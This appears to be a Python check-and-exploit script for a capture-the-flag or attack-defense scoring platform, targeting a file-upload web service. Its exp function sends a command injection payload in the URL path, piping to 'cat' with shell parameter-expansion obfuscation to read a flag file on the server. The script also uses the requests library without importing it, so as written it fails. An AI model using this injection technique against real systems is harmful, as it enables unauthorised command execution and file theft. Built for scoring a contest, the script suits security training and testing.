#!/usr/bin/env python3
# -*- coding:utf8 -*-
"""
################################################
NOTICE:
1. Please complete the content starts with [*]
2. Don't modify other content, if not necessary.
#################################################
"""

import sys
import json
# [*] PLEASE complete all dependent modules
try:
    import pwn
    pass
except ImportError as err:
    print("[!] {0}".format(err))
    exit(-1)


# [*] PLEASE complete the check func.
def check(host, port):
    """Check whether or not the service is normal.

    Params：
        host: service's host
        port: service's port

    Returns:
        A tuple.
        check_state is 1 if the service is normal, or it is 0.
        check_msg records some information, such as an error info.
    """
    try:
        # TODO
        url = f"http://{host}:{port}/upload"
        with open('1.txt', 'rb') as file:
            response = requests.post(url, files={'file': file})

        if "File './upload/1.txt' uploaded successfully!" not in response.text:
            raise requests.RequestException("Request failed")
        check_state, check_msg = 1, "ok"
    except Exception as err:
        # TODO
        check_state, check_msg = 0, str(err)
    return (check_state,check_msg)


# [*] PLEASE complete the exp func.
def exp(host, port):
    """Exploit the service whether or not.

    Params：
        host: service's host
        port: service's port

    Returns:
        A tuple.
        exp_state is 1 if the service can be exploited, or it is 0.
        exp_msg records some information, such as an error info.
    """
    try:
        # TODO
        url = f"http://{host}:{port}/"
        payload = 'uploads/|cat ${PATH%25%25u*}flag*'
        req = requests.get(url + payload)
        if 'flag' not in req.text:
            raise requests.RequestException("Request failed")
        exp_state, exp_msg = 1, "exploited"
    except Exception as err:
        # TODO
        exp_state, exp_msg = 0, str(err)
    return (exp_state, exp_msg)


# Don't modify
def main(host, port):
    """Main function.

    Params:
        host: service's host
        port: service's port

    Returns:
        A json str.
        return result to PLATFORM.
    """
    check_state, check_msg = check(host, port)
    if check_state == 1:
        exp_state, exp_msg = exp(host, port)
    else:
        exp_state = 0
        exp_msg = "Check failed"
    rst_json = {"check": [check_state, check_msg], "exp": [exp_state, exp_msg]}
    rst = json.dumps(rst_json)
    return rst


# Don't modify
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("[!] Usege: python {0} HOST PORT".format(__file__))
        exit(0)
    else:
        host = sys.argv[1]
        port = int(sys.argv[2])
        print(main(host, port))